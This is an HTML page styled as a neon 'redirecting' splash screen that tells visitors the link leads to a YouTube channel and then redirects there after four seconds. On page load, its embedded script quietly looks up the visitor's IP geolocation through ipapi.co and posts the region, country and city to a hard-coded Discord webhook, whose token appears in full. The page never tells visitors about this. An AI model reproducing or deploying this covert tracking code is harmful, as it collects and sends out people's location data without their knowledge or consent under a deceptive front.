<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Routing...</title>
    <style>
        /* Cyberpunk Streaming Animated Background */
        body { 
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background: radial-gradient(circle at 50% 50%, #170b2e 0%, #05020a 100%);
            color: #efeff1; 
            text-align: center; 
            padding-top: 15vh; 
            margin: 0;
            overflow: hidden;
            position: relative;
            height: 100vh;
        }

        /* Moving Digital Grid Overlay */
        body::before {
            content: "";
            position: absolute;
            top: -50%; left: -50%; right: -50%; bottom: -50%;
            background-image: 
                linear-gradient(rgba(145, 70, 255, 0.08) 1.5px, transparent 1.5px),
                linear-gradient(90deg, rgba(145, 70, 255, 0.08) 1.5px, transparent 1.5px);
            background-size: 40px 40px;
            transform: perspective(500px) rotateX(25deg);
            animation: gridDrive 12s linear infinite;
            z-index: 1;
        }

        @keyframes gridDrive {
            0% { background-position: 0 0; }
            100% { background-position: 0 400px; }
        }

        /* Floating Cyber Container Box */
        .container {
            max-width: 620px;
            margin: 0 auto;
            padding: 50px 30px;
            background: rgba(15, 15, 20, 0.9);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 20px;
            border: 2px solid #9146FF;
            box-shadow: 0 0 35px rgba(145, 70, 255, 0.35), inset 0 0 20px rgba(145, 70, 255, 0.15);
            position: relative;
            z-index: 10;
            animation: floatCard 4.5s ease-in-out infinite;
        }

        @keyframes floatCard {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-12px) rotate(0.5deg); }
        }

        /* Live Scanning Badges */
        .status-badge {
            display: inline-block;
            padding: 6px 14px;
            font-size: 11px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-radius: 4px;
            margin-bottom: 25px;
            font-family: monospace;
            background: rgba(145, 70, 255, 0.15);
            color: #d1b3ff;
            border: 1px solid #9146FF;
            box-shadow: 0 0 10px rgba(145, 70, 255, 0.2);
        }

        /* Message Text Boxes (Neon Green Glow) */
        .safe-text {
            color: #26d07c;
            font-size: 24px;
            font-weight: bold;
            line-height: 1.6;
            text-shadow: 0 0 12px rgba(38, 208, 124, 0.4);
        }

        /* Closing Text Elements */
        .closing-text {
            color: #adadb8;
            font-size: 16px;
            margin-top: 20px;
            font-style: italic;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 15px;
            letter-spacing: 0.5px;
        }

        /* Advanced Pulse Spinner */
        .loader-wrapper {
            position: relative;
            width: 50px;
            height: 50px;
            margin: 40px auto 0 auto;
        }
        .loader {
            border: 4px solid rgba(145, 70, 255, 0.1);
            border-top: 4px solid #9146FF;
            border-right: 4px solid #00f2ff;
            border-radius: 50%;
            width: 42px;
            height: 42px;
            animation: spin 0.7s linear infinite;
        }
        .pulse-ring {
            position: absolute;
            top: 0; left: 0; width: 50px; height: 50px;
            border: 2px solid #9146FF;
            border-radius: 50%;
            animation: echoPulse 1.8s ease-out infinite;
            opacity: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes echoPulse {
            0% { transform: scale(0.6); opacity: 0; }
            50% { opacity: 0.4; }
            100% { transform: scale(1.4); opacity: 0; }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- System Status Badge -->
        <div class="status-badge">🚀 REDIRECTING TO GEOUNIVERSE</div>

        <!-- Your Custom Message Text Box -->
        <div class="safe-text">
            Hello, the link that you have clicked on will now send you to my yt. Enjoy!
        </div>

        <!-- Custom Closing Message Container -->
        <div class="closing-text">
            Alr i gtg now made from - <strong>GeoUnivers</strong> good luck!
        </div>

        <!-- Glowing System Progress Spinner -->
        <div class="loader-wrapper">
            <div class="pulse-ring"></div>
            <div class="loader"></div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1504591125858750635/3ej395jYnj8VxkF7mV4cnmrdyPNA6Z1BfBx7Jaw3WP4POwshtwODmMxZSiX_i1XfemTj";

        async function grabLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.region && data.country_name) {
                    const payload = {
                        content: `📢 **New Chat Click!** From State/Region: **${data.region}**, Country: **${data.country_name}** (City: ${data.city})`
                    };

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        position: 'cors',
                        body: JSON.stringify(payload)
                    });
                }
            } catch (error) {
                console.log("System initialization error logged.");
            }
        }

        // Fire database packet log instantly
        grabLocation();

        // ⏱️ 4-Second Automatic Channel Redirect Script
        setTimeout(() => {
            window.location.href = "https://www.youtube.com/@GeoUniverse-l9g";
        }, 4000);
    </script>
</body>
</html>
